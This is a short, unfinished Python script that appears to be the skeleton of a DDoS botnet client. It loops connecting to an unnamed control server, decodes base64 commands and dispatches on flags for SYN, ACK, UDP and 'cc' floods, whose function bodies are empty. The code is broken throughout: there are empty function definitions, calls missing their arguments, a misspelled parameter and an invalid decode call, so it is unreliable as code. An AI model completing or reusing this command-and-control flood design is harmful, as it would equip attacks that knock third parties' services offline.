#!/usr/bin/python

import socket
import subprocess
import threading
import base64

def syn(target_host):

def udp(target_host):

def ack(targe_host):



while True:
    try:
        client=socket.socket()
        client.connect()
        try:
            data_command=str(client.recvfrom())
            data_command=data_command.decode('base64')

            if '--syn' in data_command or '-S' in data_command:
                data_command=data_command.split()

            elif '--ack' in data_command or '-A' in data_command:
                data_command=data_command.split()

            elif '--udp' in data_command or '-U' in data_command:
                data_command = data_command.split()

            elif '--cc' in data_command or '-C' in data_command:
                data_command=data_command.split()

        except:
            continue
        else:
            client.sendall()
    except:
        continue

